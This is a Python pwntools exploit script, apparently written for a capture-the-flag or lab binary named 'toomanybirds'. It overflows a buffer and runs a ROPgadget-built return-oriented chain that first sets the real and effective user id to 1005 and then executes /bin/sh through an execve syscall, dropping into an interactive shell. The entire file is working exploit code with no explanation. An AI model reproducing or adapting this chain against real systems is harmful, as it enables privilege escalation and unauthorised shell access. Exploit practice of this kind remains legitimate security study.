#!/usr/bin/env python3
# ROPgadget --ropchain --binary "binary path" > "output path"


# execve generated by ROPgadget

from struct import pack
from pwn import *

process1 = process('./toomanybirds')
print(process1.recvline())
process1.send(b"32768")

# Padding goes here
p = b"H" * 512 + p64(0x00401e31) + b"H" * 16

#
p += p64(0x000000000044e580) # pop rax ; ret
p += p64(0x71)
p += p64(0x000000000040186a) # pop rdi ; ret
p += p64(1005) # uid
p += p64(0x0000000000405f97) # pop rsi ; ret
p += p64(1005) # uid
p += p64(0x000000000041cb14)


p += p64(0x0000000000405f97) # pop rsi ; ret
p += p64(0x00000000004ca0e0) # @ .data
p += p64(0x000000000044e580) # pop rax ; ret
p += b'/bin//sh'
p += p64(0x000000000048c5e5) # mov qword ptr [rsi], rax ; ret
p += p64(0x0000000000405f97) # pop rsi ; ret
p += p64(0x00000000004ca0e8) # @ .data + 8
p += p64(0x00000000004434b9) # xor rax, rax ; ret
p += p64(0x000000000048c5e5) # mov qword ptr [rsi], rax ; ret
p += p64(0x000000000040186a) # pop rdi ; ret
p += p64(0x00000000004ca0e0) # @ .data
p += p64(0x0000000000405f97) # pop rsi ; ret
p += p64(0x00000000004ca0e8) # @ .data + 8
p += p64(0x000000000048e8eb) # pop rdx ; pop rbx ; ret
p += p64(0x00000000004ca0e8) # @ .data + 8
p += p64(0x4141414141414141) # padding
p += p64(0x00000000004434b9) # xor rax, rax ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
p += p64(0x0000000000482c60) # add rax, 1 ; ret
#p += p64(0x0000000000401223) # syscall
p += p64(0x000000000041cb14) # syscall

output = p
output += b"\n"
output += b"h" * (32768 - len(p))
process1.sendline(output)
process1.interactive()
